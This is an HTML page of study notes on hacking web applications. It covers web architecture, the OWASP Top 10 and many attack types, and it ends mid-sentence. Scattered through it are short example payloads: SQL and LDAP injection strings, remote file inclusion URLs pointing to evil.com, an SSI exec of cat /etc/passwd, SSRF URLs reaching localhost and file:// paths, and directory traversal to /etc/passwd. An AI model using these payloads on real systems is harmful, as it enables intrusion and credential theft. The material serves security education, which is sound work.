 <meta name=”robots” content=”noindex,nofollow”/>
  <a href=index.html>Back to home</a>
<hr/>
<h1>Hacking web applications</h1>
<p>Everyone connected via the internet is using various web applications for different purposes, including oneline shopping, email, chats and social networking.</p>
<p>Web applications are becoming increasingly vulnerable to more sophisticated threats and attack vectors.</p>
<h2>Web Application Concepts</h2>
<p>Web applications are software programs that run on web browsers and act as the interface between users and web servers through web pages. They enable users to request, submit, and 
retrieve data to/from a database over the internet by interacting with a GUI. Based on browser-supported programming languages such as JavaScript, HTML and CSS, web applications work in 
combination with other programming languages such as SQL to access data from the databases. Web applications are developed as dynamic web pages, and they allow users to communicate with 
servers using server-side scripts. They allow users to perform specific tasks such as searching, sending emails, connecting with friends, online shopping, tracking and tracing. </p>
<p>Whenever users need to access services, they can request them by submitting the Uniform Resource Identifier (URI) or Uniform Resource Locator (URL) of the web application in a browser.</p>
<p>Web applications offer a multitude of features, are secure and relatively easy to develop. They offer better services than many computer-based software applications and are easy to install, 
maintain and update. </p>
<p><ol>
 <ul>Independent of operating system, development and maintenance is easy and cost-effective</ul>
 <ul>accessible anytime and anywhere using only a computer with internet connection</ul>
 <ul>user interface is customizable and easy to update</ul>
 <ul>users can access them on any internet connected device</ul>
 <ul>dedicated, monitored and managed by experienced server administrators store all web application data, developers can increase workload capacity</ul>
 <ul>multiple locations of servers increase physical security and reduce the burden of monitoring thousands of desktops using the program</ul>
 <ul>flexible core technologies like JSP, Servlets, ASP, SQL server, .NET and scripting languages</ul>
</ol></p>
<p>Web applications are vulnerable to various attacks such as SQL injection, XSS and session hijacking.</p>
<h2>How do web applications work</h2>
<p>Main function is to fetch user-requested data from a database. </p>
<p><ol>
 <ul>The user enters the website name or URL in the browser and the request is sent to the web server</ul>
 <ul>The web server checks the file extension</ul>
 <ul>If the file extension is HTM(L) the web server processes the request and sends the file to the user's browser</ul>
 <ul>If the file extension is from a file that needs to be processed at server side (php, asp, cfm etc.) the web application server processes the request</ul>
 <ul>The web server passes the request to the web application server</ul>
 <ul>The web application server accesses the database to perform the requested task</ul>
 <ul>After processing the request, the web application server sends the results to the web server, which in turn sends it to the user's browser</ul>
</ol></p>
<h2>Web Application Architecture</h2>
<p>Web applications run on web browsers and use a set of <b>server-side scripts</b> (Java, C#, Ruby, PHP etc.) and <b>client-side scripts</b> (HTML, JavaScript etc.)</p>
<p>There are three layers:</p>
<p><ol>
 <ul>Client layer (presentation layer)</ul>
 <ul>Business logic layer</ul>
 <ul>Database layer</ul>
</ol></p>
<p>The <b>client</b> or <b>presentation layer</b> includes all physical devices present on the client side (laptops, smartphones, tablets, computers etc.). All these devices have operating systems and 
compatible browsers, which enable users to send requests for required web applications.</p>
<p>The <b>Business logic layer</b> consists of two layers: web-server logic layer and business logic layer. The web-server logic layer contains various components such as firewall, an HTTP request parser, 
a proxy caching server, an authentication and login handler, a resource handler and a hardware component (server). The <b>Business logic layer</b> includes the functional logic of the web application, 
which is implemented using technologies such as .NET, Java and middleware. It defines the flow of data, according to which the developer builds the application using programming languages. </p>
<p>The database layer consists of cloud services, a B2B layer that holds all the commercial transaction and a database server that supplies an organization's production data in a structured form (MS SQL Server, 
MySQL server etc.)</p>
<h1>Web Services</h1>
<p>A web service is an application or software that is deployed over the internet. It uses a standard message protocol such as SOAP to enable communication between applications developed on different 
platforms. For instance, Java-based services can interact with PHP applications. These web-based applications are integrated with SOAP, UDDI, WSDL and REST across the network. </p>
<h2>Web Service Architecture</h2>
<p>Three roles:</p>
<p><ol>
 <ul>Service Provider -> platform from where services are provided</ul>
 <ul>Service Requester -> application or client that is seeking a service or trying to establish communication with a server; in general the web browser is the requester and invokes the service on behalf of the user</ul>
 <ul>Service Registry -> place where the provider loads service descriptions; the requester discovers the service and retrieves binding data from the service descriptions</ul>
</ol></p>
<p>Three operations:</p>
<p><ol>
 <ul>Publish -> service descriptions are published to allow the requester discover services</ul>
 <ul>Find -> the requester tries to obtain the service descriptions</ul>
 <ul>Bind -> the requester calls and establishes communication with the service during run time</ul>
</ol></p>
<h2>Two artifacts:</h2>
<p><ol>
 <ul>Service -> software module offered by the service provider over the internet</ul>
 <ul>Service Description -> interface details and service implementation details; can be stored in registry and invoked by requester</ul>
</ol></p>
<h2>Web Services Characteristics</h2>
<p><ol>
 <ul>XML - based (more recent: JSON based)</ul>
 <ul>Coarse-grained service -> sometimes containing massive amounts of information is offered; a coarse-grained service is a combination of multiple fine-grained services</ul>
 <ul>Loosely coupled -> loosely coupled approach for interconnecting systems; interaction between systems can occur via web API by sending XML (JSON) messages</ul>
 <ul>Asynchronous and synchronous support -> synchronous services are called by users who wait for a response whereas asynchronous services are called by users who do not wait for a response; RPC based messages and document - 
 based messages are often used for synchronous and asynchronous web services; synchronous and asynchronous endpoints are implemented using servlets, SOAP/XML and HTTP</ul>
 <ul>RPC support -> web services support remote procedures calls (RPC) similar to traditional applications</ul>
</ol></p>
<h2>Types of web services</h2>
<p><ol>
 <ul>SOAP web services -> Simple Object Access Protocol, defines XML format; XML is used to transfer data between service provider and requester</ul>
 <ul>RESTful web services -> REpresentational State Transfer web services are designed to make the services more productive; using underlying HTTP concepts to define the services; more an architectural approach rather than 
 a protocol like SOAP</ul> 
</ol></p>
 <h2>Components of Web Service Architecture</h2>
<p><ol>
 <ul>UDDI -> Universal Description, Discovery and Integration; directory service that lists all the services available</ul>
 <ul>WSDL -> Web Services Description Language; XML based language that describes and traces web services</ul>
 <ul>WS-Security -> Web Services Security; plays important role in securing web services; extension of SOAP and aims to maintain the integrity and confidentiality of SOAP messages as well as to authenticate users</ul>
</ol></p>
<h1>Vulnerability Stack</h1>
<p><ol>
 <ul>Layer 7 -> Custom Web Applicatons -> business logic flaws / technical vulnerabilities</ul>
 <ul>Layer 6 -> Third-party components -> open source / commercial</ul>
 <ul>Layer 5 -> Web Server -> Apache / Nginx / IIS</ul>
 <ul>Layer 4 -> Database -> Oracls / MySQL / MS SQL</ul>
 <ul>Layer 3 -> Operating System -> Windows / Linux / MacOS</ul>
 <ul>Layer 2 -> Network -> Router / switch</ul>
 <ul>Layer 1 -> Security -> IPS / IDS</ul>
</ol></p>
<p>Attackers exploit the vulnerabilities of one or more elements among the seven levels to gain unrestricted access to an application or the entire network.</p>
<p><ol>
 <ul>Layer 7 -> performing input validation attacks such as XSS</ul>
 <ul>Layer 6 -> third-party components integrate with the website to achieve certain functionality (example: payment gateway of bank on a webshop); attackers exploit redirections</ul>
 <ul>Layer 5 -> attackers exploit web servers by searching for known vulnerabilities</ul>
 <ul>Layer 4 -> attackers exploit database using tools like sqlmap</ul>
 <ul>Layer 3 -> attackers scan operating systems for open ports and vulnerabilities and develop malware / backdoors to exploit them</ul>
 <ul>Layer 2 -> attackers flood switches to exhaust CAM tables and focus on sniffing data</ul>
 <ul>Layer 1 -> attackers adopt evasion techniques to circumvent IDS / IPS </ul>
</ol></p>
<h1>Web Application Threats</h1>
<p>According to <a target=_blank href=https://owasp.org>OWASP</a> the latest top 10 security risks are: </p>
<p><ol>
 <ul>A01 - Broken Access Control </ul>
 <ul>A02 - Cryptographic Failures</ul>
 <ul>A03 - Injection</ul>
 <ul>A04 - Insecure Design</ul>
 <ul>A05 - Security Misconfiguration</ul>
 <ul>A06 - Vulnerable and Outdated Components</ul>
 <ul>A07 - Identification and Authentication Failures</ul>
 <ul>A08 - Software and Data Integrity Failures</ul>
 <ul>A09 - Security Logging and Monitoring Failures</ul>
 <ul>A10 - Server-Side Request Forgery (SSRF)</ul>
</ol></p>
<h2>A01 - Broken Access Control</h2>
<p>Access control refers to how a web application grants access to create, update and delete any record / content or function to some privileged users while restricting access to other users. Broken access control 
is a method by which an attacker identifies a flaw related to access control, bypasses the authentication and compromises the network. Access control weaknesses are common because of the lack of automated detection 
and effective functional testing by application developers; They allow attackers to act as users or administrators with privileged functions and create, access, update or delete any record. </p>
<p><ol>
 <ul>Abusing least privileges or denying it by default -> everyone gains access to the roles, users or abilities</ul>
 <ul>Evading filtering of access controls by changing URL, API request, HTML page or application state via parameter tampering, force browsing or any attack tool</ul>
 <ul>Gaining permission to read or modify someone's account through their unique identifier</ul>
 <ul>Gaining access to the APIs without access controls for PUT, POST and DELETE</ul>
 <ul>Escalating privileges, where a user can act as an administrator after logging in</ul>
</ol></p>
<h2>A02 - Cryptographic Failures / Sensitive Data Exposure</h2>
<p>If users do not maintin proper security of their storage locations, the application may be at risk as attackers can access the storage and misuse the information. Some cryptographic encryption methods have 
inherent weaknesses that allow attackers to exploit and steal data. Developers can avoid attacks using algorithms to encrypt sensitive data. At the same time, cryptograpic keys have to be stored securely.</p>
<h2>A03 - Injection Flaws</h2>
<p>Web application vulnerabilities that allow untrusted data to be interpreted and executed as part of a command or query. </p>
<p><ol>
 <ul>SQL Injection -> non-validated input vulnerabilities to pass SQL commands through a web application for execution by a backend database</ul>
 <ul>Command Injection -> injecting malicious command in application</ul>
 <ul>LDAP Injection -> attack method in which websites that construct LDAP statements from user-supplied input are exploited</ul>
 <ul>Cross-Site Scripting (XSS) -> XSS allows attackers to inject and execute scripts in the victim's browser, which can hijack user sessions, deface websites or redirect the user to malicious sites</ul>
</ol></p>
<h2>SQL Injection</h2>
<p>SLQ Injection attacks use a series of malicious SQL queries or SQL statements to directly manipulate the database. SQL Injection attacks work because the application does not properly validate the input 
before passing it to an SQL statement.</p>
<p><ol>
 <ul>SELECT * FROM tablename WHERE UserID = 2302 (normal)</ul>
 <ul>SELECT * FROM tablename WHERE UserID = 2302 OR 1=1 (simple SQL injection attack)</ul>
</ol></p>
<p>The expression "OR 1=1" evaluates to the value "TRUE", often allowing the enumeration of all User ID values from the database. Attackers carry out SQL injection attacks from the web browsers's address bar, 
form fields, queries, searches and so on. It allows:</p>
<p><ol>
 <ul>Log into the application without supplying valid credentials</ul>
 <ul>Perform queries against data in the database, often even data to which the application would not normally have access</ul>
 <ul>Modify database contents or drop the database altogether</ul>
 <ul>Use the trust relationships established between the web application components to access other databases</ul>
</ol></p>
<h2>Command Injection Attacks</h2>
<p>Command Injection flaws allow attackers to pass malicious code to different systems via web applications. The attacks include calls to an operating system over system calls, use of external programs over 
shell commands and calls to backend databases over SQL. Scripts in Perl, Python and other languages execute and insert poorly designed web applications. If a web application uses any type of interpreter, 
attackers insert malicious code to inflict damage.</p>
<p>A frequently used program is <b>sendmail</b>. Carefully scrub an application before passing a piece of information through an HTTP external request. Otherwise, attackers can insert special characters, 
malicious commands and command modifiers into the information. The web application then blindly passes these characters to the external system for execution. Inserting SQL commands is a dangerous practice 
and rather widespread, as it is a command injection method. </p>
<p><ol>
 <ul>Shell Injection -> include system(), StartProcess(), java.lang.Runtime.exec(), System.Diagnostics.Process.Start() and similar APIs</ul>
 <ul>HTML Embedding -> extra HTML - based content is added; script is placed into output HTML</ul>
 <ul>File Injection -> http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil/exploit?</ul>
</ol></p>
<p>Example: an attacker enters the following malicious code (account number) with a new password:</p>
<p>www.certifiedhacker.com/banner.gif||newpassword||1036|60|468</p>
<p>The last two sets of numbers denote the banner size. Once the attacker clicks the submit button, the password for the account 1036 is changed to 'newpassword'. The server script assumes that only the 
URL of the banner image file is inserted into that field.</p>
<h2>File Injection Attack</h2>
<p>A file injection attack is a technique used to exploit "dynamic file include" mechanisms in web applications. File injection attacks enable attackers to exploit vulnerable scripts on the server to use 
a remote file instead of a presumably trusted file from the local file system. Most web application frameworks support file inclusion. An attacker enters a URL that redirects the application to the location 
of the malicious file. PHP is particularly vulnerable to these attacks because of the extensive use of "file includes" in PHP programming and default server configurations. </p>
<p>If the application ends with a php extension, and if a user requests it, then the application interprets it as a PHP script and executes it. This allows an attacker to perform arbitrary commands:</p>
<p>http://www.certifiedhacker.com/orders.php?DRINK=http://evil.com/exploit?</p>

<h2>LDAP Injection Attacks</h2>
<p>LDAP Directory Services store and organize information based on <b>attributes</b>. The information is hierarchically organized as a tree of directory entries. The <b>Lightweight Directory Access Protocol</b>
is based on the client-server model, and clients can search the directory entries using filters.</p>
<p>An LDAP injection attack works in the same way as an SQL injection attack, but it exploits user parameters to generate an LDAP query. It runs on an Internet transport protocol such as TCP, and it is an 
open-standard protocol for manipulating and querying Directory Services. An LDAP injection technique is used to take advantage of non-validated web application input vulnerabilities to pass LDAP filters used 
for searching Directory Services to obtain direct access to databases behind an LDAP tree.</p>
<p><ol>
 <ul>Login bypass</ul>
 <ul>Information disclosure</ul>
 <ul>Privilege escalation</ul>
 <ul>Information alteration</ul>
</ol></p>
<p>To test if an application is vulnerable to LDAP code injection, send a query to the server that generates an invalid input. If the LDAP server returns an error, it can be exploited with code injection 
techniques. If an attacker enters a valid username "certifiedhacker" and injects <b>certifiedhacker)(&))</b> then the URL string becomes <b>(&(USER=certifiedhacker)(&)(PASS=blah))</b>. The LDAP server
processes only the first filter; only the query <b>(&(USER=certifiedhacker)(&))</b> is processed. This query is always TRUE and the attacker logs into the system without a valid password.</p>
<p>An important defense method against such attacks is to filter all inputs to the LDAP; otherwise vulnerabilities in LDAP allow the execution of unauthorized queries or modifications of its content. 
When the attacker modifies the LDAP statements, the process runs with the same permissions as the component of the web application that executed the command.</p>

<h2>Server-Side JS Injection</h2>
<p>Server-side JavaScript injections are vulnerabilities that manifest when an application integrates user-controllable values into a string that the code interpreter dynamically validates. Attackers 
exploit improper validation of user data and pass random values to alter the code that will be compiled and executed by the server.</p>
<p>Attackers can launch a DoS attack by passing commands to the eval() function: <b>While (1)</b></p>
<p>The command forces the server's event loop to use the complete processor time and restricts it from evaluating additional inputs until the process is reinitiated.</p>

<h2>Server-Side Includes Injection</h2>
<p>Server-side includes is an application feature that helps designers to auto-generate the content of the web page without manual involvement. # directives allow developers to perform this activity. These 
directives can be files, CGI variables, shell commands etc. After evaluating all the directives, HTML is delivered to the requester.</p>
<p>Attackers launch server-side injection attacks to take control over web applications integrated with SSI directives -> <b><!_ #exec cmd="cat/etc/passwd" --></b></p>

<h2>Server-side Template Injection</h2>
<p>While creating dynamic pages, designers or developers use template engines to segregate programming logic from data presentation. Server-side template injection occurs when users are allowed to insert 
unsafe inputs into a server-side template. When this vulnerability exists, attackers can inject malicious template directives to run arbitrary code and gain complete control over the target web server. 
This injection is similar to XSS but is often employed to target server internals and achieve remote code execution, making every vulnerable application a primary target. Template injection manifests via 
designers' code errors and deliberate template disclosure while showcasing rich features of applications, blogs etc.</p>

<h2>Log Injection</h2>
<p>Attackers launch log injection attacks by exploiting unsanitized or unvalidated inputs to application logs. Applications usually store a large number of logs such as access logs, transaction logs, 
monitor logs, error logs etc. If an application or its administrator fails to log users' events or actions in a secure manner, attackers could insert fake entries or records to corrupt the log file. 
Attackers use this technique to insert misleading information in the log file for covering their tracks.</p>

<h2>HTML Injection</h2>
<p>HTML injection attack is initiated by injecting HTML code via vulnerable form inputs of a web page. It is different from JavaScript and VB script injection attacks. When the HTML code is injected, 
it allows the attacker to create a malicious form that appears to be genuine to the end users. It requests users to re-enter their credentials.</p>

<h2>CRLF Injection</h2>
<p>Carriage return line feed (CRLF) injection attack, attackers inject carriage return (\r) and line feed (\n) characters into the user's input to trick the web server, web application or user into 
believing that the current object is terminated and a new object has been initiated (HTTP request smuggling).</p>

<h2>JNDI Injection</h2>
<p>Java Naming and Directory Interface (JNDI) is a Java-based API that takes a single parameter as input and searches for the requested object based on the specified name.</p>

<h2>A04 - Insecure Design</h2>
<p>Insecure design flaws arise in an application because of the improper implementation of security controls</p>
<p><ol>
 <ul>Request forgery</ul>
 <ul>Authentication hijacking</ul>
 <ul>Identity theft</ul>
 <ul>Data loss</ul>
 <ul>DoS attacks</ul>
</ol></p>
<h2>A05 - Security Misconfigurations</h2>
<p>Unvalidated Inputs -> input from a client is not validated before being processed by web applications and backend servers.</p>
<p>Parameter / Form Tampering -> manipulation of parameters exchanged between client and server. This information is actually stored in cookies, hidden form fields or URL query strings. </p>
<p>Improper Error Handling -> insights in source code</p>
<p><ol>
 <ul>Null pointer exceptions</ul>
 <ul>System call failure</ul>
 <ul>Database unavailable</ul>
 <ul>Network timeout</ul>
 <ul>Database information</ul>
 <ul>Web application logical flow</ul>
 <ul>Application environment</ul>
</ol></p>
<h2>Insufficient Transport Layer Protection</h2>
<p>When an application fails to protect sensitive traffic flowing in a network. It supports weak algorithms and uses expired or invalid certificates. Developers should use SSL/TLS authentication 
for authentication on the websites; otherwise an attacker can monitor the network traffic.</p>
<h2>Improper Restriction of XML External Entity (XXE)</h2>
<p>Many older or poorly configured XML processors evaluate externel entity references within XML documents. External entities can disclose internal files using the file URI handler, internal SMB 
file shares on unpatched Windows servers, internal port scanning, remote code execution and DoS attacks such as the billion laughs attack.</p>
<p><ol>
 <ul>Missing security hardening</ul>
 <ul>Server software flaws</ul>
 <ul>Enabling unnecessary services</ul>
 <ul>Improper authentication</ul>
 <ul>Unpatched security flaws</ul>
 <ul>Server configuration problems</ul>
 <ul>Default accounts with default credentials</ul>
 <ul>Legacy software</ul>
</ol></p>
<h2>XML External Entity (XXE)</h2>
<p>An XML External Entity attack is a Server-side Request Forgery (SSRF) attack whereby an application can parse XML input from an unreliable source because of the misconfigured XML parser.
In this attack, an attacker sends a malicious XML input containing a reference to an external entity to the victim's web application. When this malicious input is processed by a weakly 
configured XML parser of the target web application, it enable the attacker to access protected files and services from servers or connected networks.</p>

<h2>A06 - Vulnerable and Outdated Components/Using Components with Known Vulnerabilities</h2>
<p>Components such as libraries and frameworks that are used in most web applications always execute with full privileges, and flaws in any component can have severe consequences. Attackers can 
identify weak components or dependencies by scanning or by performing manual analysis. Attackers search for any vulnerabilities on exploit sites. If a vulnerable component is identified, the 
attacker customizes the exploit as required and executes the attack. Succesful exploitation allows the attacker to cause serious data loss or take over control of the servers. </p>

<h2>A07 - Identification and Authentication Failures / Broken Authentication</h2>
<p>To impersonate users, an attacker exploits vulnerabilities in the authentication or session management functions such as exposed accounts, session IDs, logout, password management, timeouts, remember me, 
secret question, account update and others.</p>
<p><ol>
 <ul>If <b>Session IDs are exposed in the URL</b> the web application is vulnerable to session fixation attacks</ul>
 <ul>Attackers can identify passwords stored in databases because of weak hashing algorithms; attackers can gain access to the web application's password database if user passwords are not encrypted</ul>
 <ul>If the <b>session timeout</b> is long and the session IDs are not changed after every login, attackers may hijack a session and take control of it with the same privileges as the victim</ul>
</ol></p>
<h2>A08 - Software and Data Integrity Failures</h2>
<p>Software and data integrity failures occur when organizations fail to update the applications' software with the latest versions or patches. Often, web applications rely on plugins, dependencies, 
libraries or packages that can be installed from public repositories, content delivery networks (CDNs) or untrusted sources, which makes them vulnerable to attacks. The common security weaknesses in this 
category include the inclusion of functionalities from an untrusted control sphere, download of code without integrity checks and deserialization of untrusted data.</p>
<p><ol>
 <ul>Cache poisoning</ul>
 <ul>Code injection</ul>
 <ul>Command execution</ul>
 <ul>Denial of Service</ul>
 <ul>Data theft</ul>
</ol></p>
<h2>Insecure Deserialization</h2>
<p>Data is stored in the form of data structures (graph, trees, array etc.), data serialization and deserialization is an effective process for linearizing and de-linearizing data objects to transport them 
to other networks or systems. </p>
<p><b>Serialization</b>: an object 'employee' consists of data such as name, age, city, empID. Due to the process of serialization, the object data will be converted into the following linear format for 
transportation to different systems or different nodes: <Employee><Name>Rinni</Name><Age>26</Age><City>Nevada</City><empID>2201</empID></Employee></p>
<p><b>Deserialization</b>: reverse process of serialization, whereby the object data is recreated from the linear serialized data. Due to the process of deserialization, the serialized Employee object 
given in the example will be reconverted into the object data</p>
<p>The process of serialization and deserialization is effectively used in communication between networks, and its widespread usage attracts attackers to exploit the flaws in this process. Attackers inject 
malicious code into serialized linear formatted data and forward the malicious serialized data to the victim:</p>
<p><Employee><Name>Rinni</Name><Age>26</Age><City>Nevada</City><empID>2201</empID>MALICIOUS PROCEDURE</Employee></p>
<p>Due to insecure deserialization, the injected malicious code will be undetected and remain present in the final execution of the deserialization code. This results in the execution of malicious procedures 
along with the execution of serialized data. This could have a severe impact on the system, as it would authorize the attacker to execute and run systems remotely.</p>
<h2>A09 - Security Logging and Monitoring Failures / Insufficient Logging and Monitoring</h2>
<p>Insufficient logging and monitoring refer to scenarios in which the detection software either fails to record a malicious event of ignores important details about the event.</p>
<p><ol>
 <ul>Logs that do not provide information about overall logins, failed login attempts and important transactions</ul>
 <ul>Warnings and error messages that provide vague and insufficient log information</ul>
 <ul>Inappropriate monitoring of applications and API logs</ul>
 <ul>Local storage of logs</ul>
 <ul>Improper or no implementation of response escalation processes</ul>
 <ul>Dynamic application security testing (DAST) tools such as OWASP ZAP that fail to generate alerts</ul>
 <ul>Web applications that are not capable of detecting, escalating or issuing alerts of suspicious activities in real time</ul>
</ol></p>

<h2>A10 - Server-Side Request Forgery (SSRF)</h2>
<p>SSRF vulnerabilities evolve from the unsafe use of functions in an application, in public web servers to send crafted requests to internal or backend servers. Internal servers usually employ firewalls to 
prevent unwanted traffic inflows to the network. Therefore, attackers leverage SSRF vulnerabilities in internet-facing web servers to gain access to backend servers that are protected by a firewall, VPN or ACL. 
The backend server believes that the request is make by the web server because these servers are on the same network; consequently the backend server responds with the data stored in it.</p>
<p>SSRF vulnerabilities evolve in the following manner: Generally, server-side requests are initiated to obtain information from an external resource and feed it into an application. For example: https://xyz.com/feed.php?url=externalsite.com/feed/to to 
obtain a remote feed. If attackers can alter the URL input to the localhost, they can view all the local resources on the server.</p>
<p>Once the attack is succesful, attackers can perform various activities such as port scanning, network scanning, IP address discovery, reading of web server files, bypassing of host-based authentication, 
interaction with critical protocols and remote code execution.</p>

<h2>Types of SSRF Attacks</h2>
<p><ol><ul>Injecting an SSRF payload</ul>
<ul>Gaining access to internal resources -> file://path/to/file</ul>
<ul>Gaining access to internal pages -> https://www.certifiedhacker.com/page?url=http://127.0.0.1/admin</ul>
<ul>Using a URL scheme to access internal files -> https://www.certifiedhacker.com/page?url=file://etc/password</ul>
 <ul>Using a URL scheme to access internal services -> https://www.certifiedhacker.com/page?url=ftp://attacker.net:11211</ul>
</ol></p>

<h2>Cross-Site Port Attack (XSPA)</h2>
<p>This type of SSRF attack allows attackes to scan for the open ports of a server. Attackers use a loopback interface of that server such as localhost or 127.0.0.1; Further, attackers can use scanned ports such as 
port 21, 22 and 25 along with the loopback interface -> https://www.certifiedhacker.com/page?url=http://localhost:22</p>

<h2>Other Web Application Threats</h2>
<p>Web application threats are not limited to attacks based on URL and port 80. Despite using ports, protocols and OSI layers, vendors must protect the integrity of mission-critical applications from possible 
future attacks by being able to deal with all attack methods.</p>
<h2>Directory Traversal</h2>
<p>Access to restricted directories; executing commands outside the web server's root directory</p>
<h2>Unvalidated Redirects and Forwards</h2>
<p>Attackers lure victims into clicking on unvalidated links that appear to be legitimate. Such redirects may attempt to install malware or trick victims into disclosing passwords or other sensitive information. 
Unsafe forwards may allow access control bypass, leading to</p>
<p><ol>
 <ul>Session Fixation Attack</ul>
 <ul>Security Management Exploits</ul>
 <ul>Failure to Restrict URL Access</ul>
 <ul>Malicious File Execution</ul>
</ol></p>
<h2>Watering Hole Attack</h2>
<p>Unvalidated redirect attack whereby the attacker first identifies the most visited website of the target, determines the vulnerabilities in the website, injects malicious code into the vulnerable web application 
and then waits for the victim to browse the website. Once the victim tries to access the website, the malicious code executes, infecting the victim.</p>
<h2>Cross-Site Request Forgery</h2>
<p>The cross-site request forgery method is a type of attack in which an authenticated user is made to perform certain tasks on the web application that an attacker chooses; a user clicking on a particular
link sent through an email or chat</p>
<h2>Cookie / Session Poisoning</h2>
<p>By changing the information inside a cookie, attackers bypass the authentication process. Once they gain control over a network, they can modify its content, use the system for a malicious attack, or 
steal information from users's systems</p>
<h2>Web Service Attacks</h2>
<p>An attacker injects a malicious script into a web service and can then disclose and modify application data</p>
<h2>Cookie Snooping</h2>
<p>Attackers use cookie snooping on victims' systems to analyze the users' surfing habits and sell that information to other attackers or to launch various attacks on the victims' web applications</p>
<h2>Hidden field manipulation</h2>
<p>Attackers can alter prices and conclude transactions, designating prices of their choice</p>
<h2>Obfuscation application</h2>
<p>Network and host-based intrusion detection systems (IDSs) constantly look for signs of well-known attacks, driving attackers to seek different ways to remain undetected. The most common method of attack 
obfuscation involves encoding portions of the attack with unicode, utf-8, base64 or URL encoding</p>
<h2>DoS</h2>
<p>A DoS attack is an attack on the availability of a service, which reduces, restricts or prevents access to system resources by its legitimate users</p>
<h2>Buffer overflow</h2>
<p>A web application's buffer overflow vulnerability occurs when it fails to guard its buffer properly and allows writing beyond its maximum size</p>
<h2>CAPTCHA Attacks</h2>
<p>Challenge-response type of test implemented by web applications to check whether the response is generated by a computer. CAPTCHAs are prone to various types of attacks</p>
<h2>Platform Exploits</h2>
<p>Users can build web applications with platforms as BEA WebLogic and Cold Fusion. Each platform has various vulnerabilities and exploits associated with it</p>
<h2>Network Access Attacks</h2>
<p>Can majorly effect web applications, including a basic level of service</p>
<h2>DMZ Protocol Attacks</h2>
<p>Compromise of web application and data; defacement of web sites; access to internal systems incl. databases, backups and source code</p>
<h2>Web-based Timing Attacks</h2>
<p>Exploit side-channel leakage and estimate the amount of time take for secret key operations. Attackers perform these attacks to retrieve usernames and passwords for accessing web applications</p>
<h2>MarioNet Attack</h2>
<p>Attacker abuses the Service Workers API to inject and run malicious code in the victim's browser to perform various attacks like cryptojacking, DDoS, click fraud and distributed password cracking</p>
<h2>RC4 NOMORE Attack</h2>
<p>Rivest Cipher Numerous Occurrence MOnitoring and Recovery Exploit attack is an attack against the RC4 stream cipher. This attack exploits the vulnerabilities present in a web server that uses the RC4 
encryption algorithm for accessing ancrypted sensitive information. Attackers use RC4 NOMORE to decrypt the web cookies secured by the HTTPS protocol and inject arbitrary packets. After stealing a valid cookie, 
the attacker impersonates the victim and logs into the website using the victim's credentials to perform malicious activities and unauthorized transactions</p>
<h2>Clickjacking Attack</h2>
<p>In clickjacking the attacker loads the target website inside a low opacity iframe. Then, the attacker designs a page such that all the clickable items such as buttons are positioned exactly as on the 
selected target website. When the victim clicks on the invisible elements, the attacker performs various malicious actions</p>
<h2>JavaScript hijacking</h2>
<p>JavaScript hijacking, also known as JSON hijacking, is a vulnerability that enables attackers to capture sensitive information from systems using JavaScript Objects (JSON) as a data carrier. These 
vulnerabilities arise from flaws in the web browser's same-origin policy that permits a domain to add code from another domain</p>
<h2>DNS Rebinding Attack</h2>
<p>DNS rebinding can bypass the same-origin policy's security constraints and communicate with or make arbitrary requests to local domains through a malicious web page</p>
<h2>Same-Site Attack</h2>
<p>Occurs when an attacker hosts a malicious website on the subdomain of a legitimate application for tricking users into navigate to a malicious website, from which the attacker can collect sensitive data 
of the users</p>
<h2>Pass-the-Cookie Attack</h2>
<p>Allows attackers to access a web application without providing user credentials. Attackers steal cookies from the target user's browser and inject those cookies into their session to bypass the 
authentication at the target server</p>
<h2>Directory Traversal</h2>
<p>When access is provided outside a defined application, there exists the possibility of unintended information disclosure or modification. Complex applications are configured with multiple directories
that exist as application components and data. An application can traverse these directories to locate and execute the legitimate portions of an application. A directory traversal / forceful browsing 
attack occurs when the attacker is able to browser the directories and files outside the normal application access. Such an attack exposes the directory structure of an application and often the underlying 
web server and operating system. Directory traversal allows attackers to access restricted directories, including application source code, configuration and critical system files, and execute commands outside 
the web server's root directory. With this level of access to web application architecture, an attacker can</p>
<p><ol>
 <ul>Enumerate the contents of files and directories</ul>
 <ul>Access pages that otherwise require authentication (and possibly payment)</ul>
 <ul>Gain secret knowledge of the application and its construction</ul>
 <ul>Discover user IDs and passwords stored in hidden files</ul>
 <ul>Locate source code and other interesting files left on the server</ul>
 <ul>View sensitive data such as customer information</ul>
</ol></p>
<p>Example:</p>
<p><ol>
 <ul>"../" goes back to several directories</ul>
 <ul>http://www.targetsite.com/../../../sitebackup.zip</ul>
 <ul>http://www.targetsite.com/../../../../etc/passwd</ul>
</ol></p>
<h2>Unvalidated Redirects and Forwards</h2>
<p>Unvalidated redirects enable attackers to install malware or trick victims into disclosing passwords or other sensitive information, whereas unsafe forwards may allow access control bypass. An attacker 
sends links to unvalidated redirects and lures the victim into clicking on them. When te victim clicks the link, thinking that it's a valid site, it redirects the victim to another site. Such redirects lead 
to install malware and may even trick victims into disclosing passwords or other sensitive information. An attacker targets unsafe forwarding to bypass security checks. </p>
<p><ol>
 <ul>Session Fixation Attack -> the attacker tricks or attracts the user to access a legitimate web server using an explicit session ID value</ul>
 <ul>Security Management Exploits -> some attackers target security management systems, either network or application based, to modify or disable security enforcement</ul>
 <ul>Failure to Restrict URL Access </ul>
 <ul>Malicious File Execution -> malicious file execution vulnerabilities are present in most applications, enabling to install a rootkit and take over complete control</ul>
</ol></p>
<p>In an <b>unvalidated redirect</b> scenario, a user receives a phishing email from an attacker, luring the user into clicking the link. The link seems to be legitimate because it contains the name of a 
legitimate website at the beginning of the url. However, the latter part of the link contains a malicious URL to redirect the victim. <b>Unvalidated forwarding</b> allows attackers to access sensitive 
pages that are generally restricted from viewing -> http://www.certifiedhacker.com/purchase.jsp?fwd=admin.jsp. The server, without proper validation, redirects the attacker to the sensitive admin page, 
where he/she can access purchase records, registered users and so on. Using this technique, an attacker can succesfully bypass any security checks.</p>
<p><ol>
 <ul>Open Redirection -> attackers can add their own parameters to a URL to redirect users from trusted websites to malicious sites where they can steal sensitive data</ul>
 <ul>Header-Based Open Redirection -> modifying the HTTP location header to redirect users to malicious page without their knowledge; it serves the operation when JavaScript fails to interpret the header</ul>
 <ul>JavaScript-Based Open Redirection -> injecting JavaScript into a web-page response received from the corresponding web server; this type or open redirects is mostly used in phishing scams, where users are unaware 
 that they are navigating to a malicious website</ul>
</ol></p>
<h2>Watering Hole Attack</h2>
<p>The attacker identifies the kind of websites frequently surfed by a target company / individual and tests these websites to identify any possible vulnerabilities. Once the attacker identifies the 
